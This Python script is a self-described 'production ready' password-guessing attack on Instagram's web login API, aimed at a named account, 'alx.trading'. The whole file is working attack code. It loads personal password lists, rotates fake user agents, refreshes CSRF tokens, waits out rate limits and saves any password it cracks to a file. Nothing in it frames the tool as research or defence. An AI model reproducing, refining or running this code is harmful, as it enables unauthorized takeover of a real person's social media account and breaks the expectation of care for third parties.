#!/usr/bin/env python3
"""
🔥 PRODUCTION READY ATTACK LAUNCHER 🔥
Clean, working version for real deployment
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import asyncio
import aiohttp
import json
import time
import random
import re
import os
from datetime import datetime
from fake_useragent import UserAgent


class ProductionAttacker:
    def __init__(self, target_username="alx.trading"):
        self.target_username = target_username
        self.ua = UserAgent()
        self.attack_stats = {
            'attempts': 0,
            'rate_limits': 0,
            'checkpoints': 0,
            'start_time': time.time()
        }

    def display_banner(self):
        print("\n" + "="*60)
        print("🔥💀 PRODUCTION INSTAGRAM ATTACK 💀🔥")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"🎯 Target: {self.target_username}")
        print(f"📅 Launch: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("🌐 Mode: REAL PRODUCTION ATTACK")
        print("="*60 + "\n")

    def load_passwords(self):
        """Load all available password databases"""
        password_files = [
            'deep_personal_passwords.txt',
            'priority_passwords.txt',
            'emergency_passwords.txt',
            'stealth_passwords.txt'
        ]

        all_passwords = []
        workspace = "/workspaces/sugarglitch-realops"

        for pwd_file in password_files:
            file_path = os.path.join(workspace, pwd_file)
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'r') as f:
                        passwords = [
                            line.strip() for line in f
                            if line.strip() and not line.startswith('#')
                        ]
                    all_passwords.extend(passwords)
                    print(f"✅ Loaded {len(passwords)} from {pwd_file}")
                except Exception as e:
                    print(f"⚠️ Error loading {pwd_file}: {e}")

        # Remove duplicates while preserving order
        unique_passwords = []
        seen = set()
        for pwd in all_passwords:
            if pwd not in seen:
                seen.add(pwd)
                unique_passwords.append(pwd)

        print(f"📊 Total unique passwords: {len(unique_passwords)}")
        return unique_passwords

    async def create_session(self):
        """Create optimized session for Instagram"""
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': self.ua.random,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/',
                'X-Requested-With': 'XMLHttpRequest',
            }
        )
        return session

    async def get_csrf_token(self, session):
        """Get fresh CSRF token from Instagram"""
        try:
            print("🔑 Fetching fresh CSRF token...")
            async with session.get('https://www.instagram.com/') as response:
                if response.status == 200:
                    text = await response.text()

                    # หาหลายแบบเผื่อ Instagram เปลี่ยน format
                    csrf_patterns = [
                        r'"csrf_token":"([^"]+)"',
                        r'csrf_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'csrftoken["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                    ]

                    for pattern in csrf_patterns:
                        csrf_match = re.search(pattern, text)
                        if csrf_match:
                            token = csrf_match.group(1)
                            print(
                                f"✅ CSRF Token acquired: {token[:8]}...{token[-4:]}")
                            return token

                    print("⚠️ CSRF token pattern not found in response")
                else:
                    print(f"❌ Failed to get Instagram page: {response.status}")

        except Exception as e:
            print(f"❌ CSRF Error: {e}")
        return None

    async def attempt_login(self, session, password, csrf_token):
        """Attempt Instagram login"""
        try:
            payload = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
            }

            headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': self.ua.random,
            }

            async with session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=payload,
                headers=headers
            ) as response:

                self.attack_stats['attempts'] += 1
                response_text = await response.text()

                # แสดงข้อมูลการตอบกลับเพื่อวิเคราะห์
                print(f"   📡 Response Status: {response.status}")

                if response.status == 200:
                    # ตรวจสอบความสำเร็จ
                    if '"authenticated":true' in response_text:
                        print(f"   🎉 SUCCESS RESPONSE DETECTED!")
                        return {'success': True, 'password': password}

                    # ตรวจสอบ checkpoint
                    elif 'checkpoint' in response_text.lower():
                        self.attack_stats['checkpoints'] += 1
                        print(f"   🚧 CHECKPOINT TRIGGERED!")
                        print(
                            f"   📄 Response snippet: {response_text[:200]}...")
                        return {'checkpoint': True, 'password': password}

                    # ตรวจสอบ 2FA
                    elif 'two_factor' in response_text.lower():
                        print(f"   🔐 2FA REQUIRED!")
                        return {'2fa': True, 'password': password}

                    # ตรวจสอบ error messages อื่นๆ
                    elif 'incorrect' in response_text.lower():
                        print(f"   ❌ Incorrect password")
                    elif 'user' in response_text.lower() and 'not' in response_text.lower():
                        print(f"   ⚠️ User not found response")
                    else:
                        # แสดง response ที่ไม่คาดคิด
                        snippet = response_text[:100].replace('\n', ' ')
                        print(f"   🤔 Unknown response: {snippet}...")

                elif response.status == 429:
                    self.attack_stats['rate_limits'] += 1
                    print(f"   ⏳ RATE LIMITED - need to slow down")
                    return {'rate_limit': True}

                elif response.status == 400:
                    print(f"   ⚠️ Bad Request - possibly blocked")
                    snippet = response_text[:150].replace('\n', ' ')
                    print(f"   📄 Error details: {snippet}")

                else:
                    print(f"   ❓ Unexpected status: {response.status}")

                return {'failed': True, 'status': response.status, 'response': response_text[:500]}

        except Exception as e:
            print(f"   💥 Exception: {str(e)[:100]}")
            return {'error': str(e)}

    def display_stats(self):
        """Display current attack statistics"""
        runtime = int(time.time() - self.attack_stats['start_time'])
        rate = self.attack_stats['attempts'] / max(runtime, 1)

        print(f"\n📊 ATTACK STATISTICS")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"⏱️  Runtime: {runtime}s")
        print(f"🔐 Attempts: {self.attack_stats['attempts']}")
        print(f"⚡ Rate: {rate:.2f} attempts/sec")
        print(f"🚧 Checkpoints: {self.attack_stats['checkpoints']}")
        print(f"⏳ Rate Limits: {self.attack_stats['rate_limits']}")

    async def run_attack(self, max_passwords=100):
        """Run the main attack"""
        self.display_banner()

        # Load passwords
        passwords = self.load_passwords()
        if not passwords:
            print("❌ No passwords loaded!")
            return

        # Limit passwords for production run
        attack_passwords = passwords[:max_passwords]
        print(f"🎯 Attacking with top {len(attack_passwords)} passwords\n")

        session = await self.create_session()

        try:
            for i, password in enumerate(attack_passwords):

                # Get fresh CSRF token every 10 attempts
                if i % 10 == 0:
                    csrf_token = await self.get_csrf_token(session)
                    if not csrf_token:
                        print("❌ Could not get CSRF token")
                        continue

                print(f"🔓 Attempt #{i+1}: {password}")
                result = await self.attempt_login(session, password, csrf_token)

                # Handle results
                if result.get('success'):
                    print(f"\n🎉 SUCCESS! Password found: {password}")
                    self.save_success(password)
                    break

                elif result.get('checkpoint'):
                    print(f"🚧 CHECKPOINT triggered with: {password}")
                    print("   → This password might be correct!")
                    self.save_checkpoint(password)

                elif result.get('2fa'):
                    print(f"🔐 2FA required for: {password}")
                    print("   → Password is likely CORRECT!")
                    self.save_success(password, "2FA_REQUIRED")
                    break

                elif result.get('rate_limit'):
                    print("⏳ Rate limited - implementing smart delay...")
                    await asyncio.sleep(60)
                    continue

                # Display stats every 20 attempts
                if i % 20 == 0 and i > 0:
                    self.display_stats()

                # Smart delay
                await asyncio.sleep(random.uniform(3, 7))

        finally:
            await session.close()
            self.display_stats()
            print("\n🔥 Attack completed!")

    def save_success(self, password, result_type="SUCCESS"):
        """Save successful results"""
        result_data = {
            'target': self.target_username,
            'password': password,
            'result_type': result_type,
            'timestamp': datetime.now().isoformat(),
            'stats': self.attack_stats
        }

        filename = f"SUCCESS_{self.target_username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result_data, f, indent=2)

        print(f"💾 Success saved to: {filename}")

    def save_checkpoint(self, password):
        """Save checkpoint results"""
        result_data = {
            'target': self.target_username,
            'checkpoint_password': password,
            'timestamp': datetime.now().isoformat(),
            'note': 'Checkpoint triggered - password might be correct'
        }

        filename = f"CHECKPOINT_{self.target_username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result_data, f, indent=2)

        print(f"💾 Checkpoint saved to: {filename}")


async def main():
    """Main execution"""
    print("🚀 INITIALIZING PRODUCTION ATTACK SYSTEM...")

    # Create attacker instance
    attacker = ProductionAttacker("alx.trading")

    try:
        # Run attack with top 100 passwords
        await attacker.run_attack(max_passwords=100)

    except KeyboardInterrupt:
        print("\n⏹️ Attack stopped by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
